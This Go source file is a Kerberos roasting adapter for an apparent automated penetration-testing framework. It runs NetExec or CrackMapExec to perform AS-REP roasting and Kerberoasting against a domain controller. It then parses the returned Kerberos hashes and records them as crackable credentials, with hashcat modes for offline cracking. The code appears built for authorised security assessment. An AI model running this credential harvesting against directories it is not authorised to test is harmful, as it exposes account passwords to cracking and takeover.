// Package kerberoast is a Phase-5 internal/AD adapter that performs Kerberos
// roasting — AS-REP roasting (accounts with "do not require pre-auth") and
// Kerberoasting (service accounts with SPNs) — via an EXTERNAL tool: NetExec
// (nxc/netexec) or CrackMapExec. Recovered Kerberos hashes are crackable
// OFFLINE (hashcat 18200 / 13100), so they feed tyto's recovered-credential
// model as CredHash entries (redacted in the audit trail, never to the planner).
//
// Like the other AD adapters it is runtime-detected and DEGRADES GRACEFULLY when
// no tool is installed. It is identity-category and RiskMedium: roasting requests
// tickets the directory already hands out, modifying nothing — but it yields
// crackable secrets, so it sits above plain enumeration. Kerberoasting needs an
// authenticated bind; the engine injects matching provisioned domain credentials.
package kerberoast

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/dukotah/tyto/internal/action"
	"github.com/dukotah/tyto/internal/state"
)

// Tool implements an external Kerberos roasting adapter.
type Tool struct{}

// New returns a kerberoast Tool.
func New() *Tool { return &Tool{} }

// Name implements tool.Tool.
func (t *Tool) Name() string { return "kerberoast" }

// Category implements tool.Tool.
func (t *Tool) Category() action.Category { return action.CategoryIdentity }

// MaxRisk implements tool.Tool.
func (t *Tool) MaxRisk() action.RiskLevel { return action.RiskMedium }

const maxOutput = 256 * 1024

var candidates = []string{"nxc", "netexec", "crackmapexec"}

// Execute detects an external roasting tool and runs AS-REP + Kerberoast against
// the target DC. With no tool installed it degrades gracefully. Recovered hashes
// become Credentials (CredHash) and a finding per roastable principal.
func (t *Tool) Execute(ctx context.Context, a action.Action) (action.Result, error) {
	res := action.Result{ActionID: a.ID, Tool: t.Name(), StartedAt: time.Now().UTC()}
	host := hostOf(a.Target)

	bin := detectTool()
	if bin == "" {
		res.Findings = append(res.Findings, state.Finding{
			ID:          "F-" + a.ID,
			Title:       "No Kerberos roasting tool installed (install netexec/crackmapexec) — optional adapter",
			Severity:    state.SeverityInfo,
			Target:      host,
			Description: "kerberoast is a runtime-detected shell-out adapter. None of nxc/netexec/crackmapexec were found on PATH, so AS-REP/Kerberoast was skipped. Install NetExec to enable it.",
			Evidence:    "exec.LookPath: nxc/netexec/crackmapexec not found",
			Tool:        t.Name(),
			FoundAt:     time.Now().UTC(),
		})
		res.Success = true
		res.Output = "no roasting tool installed; skipped (graceful degrade)"
		res.FinishedAt = time.Now().UTC()
		return res, nil
	}

	select {
	case <-ctx.Done():
		res.FinishedAt = time.Now().UTC()
		res.Err = ctx.Err().Error()
		return res, ctx.Err()
	default:
	}

	user, pass, domain := a.Params["username"], a.Params["password"], a.Params["domain"]

	// AS-REP roasting can run without a password (it targets DONT_REQ_PREAUTH
	// accounts); Kerberoasting needs an authenticated bind. Run whichever the
	// available creds permit and merge the captured output.
	var combined strings.Builder
	runMode := func(flag string) {
		args := []string{"ldap", host, "-u", user, "-p", pass}
		if domain != "" {
			args = append(args, "-d", domain)
		}
		// NetExec writes hashes to a file arg AND echoes them; give it a temp sink
		// and parse stdout (we never read the file back).
		if f, err := os.CreateTemp("", "tyto-roast-*.txt"); err == nil {
			name := f.Name()
			_ = f.Close()
			defer os.Remove(name)
			args = append(args, flag, name)
		} else {
			args = append(args, flag)
		}
		out, _ := exec.CommandContext(ctx, bin, args...).CombinedOutput()
		combined.WriteString(string(out))
		combined.WriteString("\n")
	}

	runMode("--asreproast")
	if user != "" && pass != "" {
		runMode("--kerberoasting")
	}

	out := combined.String()
	if len(out) > maxOutput {
		out = out[:maxOutput]
	}

	creds, findings := parseRoast(out, host)
	for i := range findings {
		findings[i].ID = fmt.Sprintf("F-%s-%d", a.ID, i)
		findings[i].Tool = t.Name()
		if findings[i].Target == "" {
			findings[i].Target = host
		}
		if findings[i].FoundAt.IsZero() {
			findings[i].FoundAt = time.Now().UTC()
		}
	}
	for i := range creds {
		creds[i].ID = fmt.Sprintf("C-%s-%d", a.ID, i)
		if creds[i].Target == "" {
			creds[i].Target = host
		}
	}
	res.Findings = append(res.Findings, findings...)
	res.Credentials = append(res.Credentials, creds...)

	summary := fmt.Sprintf("%s roast %s: %d hash(es) recovered", bin, host, len(creds))
	res.Success = true
	res.Output = summary
	res.FinishedAt = time.Now().UTC()
	return res, nil
}

func detectTool() string {
	for _, c := range candidates {
		if p, err := exec.LookPath(c); err == nil && p != "" {
			return c
		}
	}
	return ""
}

// parseRoast extracts Kerberos hashes from NetExec/CrackMapExec roasting output.
// It recognizes both AS-REP ($krb5asrep$) and Kerberoast ($krb5tgs$) hashes,
// builds a recovered-credential (CredHash) per hash, and a finding per roastable
// principal. Host-agnostic + side-effect-free so it is unit-testable on captured
// output. AS-REP roastability is a real misconfiguration (pre-auth disabled) →
// High; a kerberoastable SPN is expected but the hash is crackable → Medium.
func parseRoast(output, host string) ([]state.Credential, []state.Finding) {
	var creds []state.Credential
	var findings []state.Finding
	seen := map[string]bool{}

	for _, line := range strings.Split(output, "\n") {
		hash := extractHash(line)
		if hash == "" || seen[hash] {
			continue
		}
		seen[hash] = true

		var kind, label string
		var sev state.Severity
		switch {
		case strings.HasPrefix(hash, "$krb5asrep$"):
			kind, label, sev = "asrep", "AS-REP roastable (pre-auth disabled)", state.SeverityHigh
		case strings.HasPrefix(hash, "$krb5tgs$"):
			kind, label, sev = "kerberoast", "Kerberoastable service account (SPN)", state.SeverityMedium
		default:
			continue
		}

		user := principalOf(hash)
		creds = append(creds, state.Credential{
			Kind:     state.CredHash,
			Username: user,
			Secret:   hash,
			Source:   "kerberoast:" + kind,
			Target:   host,
		})
		findings = append(findings, state.Finding{
			Title:       fmt.Sprintf("%s: %s", label, nonEmpty(user, "unknown")),
			Severity:    sev,
			Target:      host,
			Description: fmt.Sprintf("Recovered a crackable Kerberos %s hash for %q. Crack offline (hashcat %s); a weak password yields the account's credentials.", kind, nonEmpty(user, "unknown"), hashcatMode(kind)),
			Evidence:    truncate(hash, 80),
			Validated:   true,
		})
	}
	return creds, findings
}

// extractHash returns the Kerberos hash token in a line, or "". NetExec prefixes
// console lines (LDAP <ip> <port> <host> ...) so we scan tokens for the marker.
func extractHash(line string) string {
	for _, tok := range strings.Fields(line) {
		if strings.HasPrefix(tok, "$krb5asrep$") || strings.HasPrefix(tok, "$krb5tgs$") {
			return tok
		}
	}
	return ""
}

// principalOf pulls the account name out of a Kerberos hash string.
//
//	$krb5asrep$23$USER@REALM:...            -> USER
//	$krb5tgs$23$*USER$REALM$...             -> USER
//	$krb5tgs$23$USER$REALM$...              -> USER
func principalOf(hash string) string {
	parts := strings.Split(hash, "$")
	// parts: ["", "krb5asrep"/"krb5tgs", "23", <principal-ish>, ...]
	if len(parts) < 4 {
		return ""
	}
	p := parts[3]
	p = strings.TrimPrefix(p, "*")
	if i := strings.IndexAny(p, "@:"); i >= 0 {
		p = p[:i]
	}
	return strings.TrimSpace(p)
}

func hashcatMode(kind string) string {
	if kind == "asrep" {
		return "18200"
	}
	return "13100"
}

func nonEmpty(s, fallback string) string {
	if strings.TrimSpace(s) == "" {
		return fallback
	}
	return s
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

// hostOf strips scheme/path/port from a target to get a usable host.
func hostOf(target string) string {
	t := target
	if i := strings.Index(t, "://"); i >= 0 {
		t = t[i+3:]
	}
	if i := strings.IndexAny(t, "/?#"); i >= 0 {
		t = t[:i]
	}
	if h, _, err := net.SplitHostPort(t); err == nil {
		t = h
	}
	return t
}
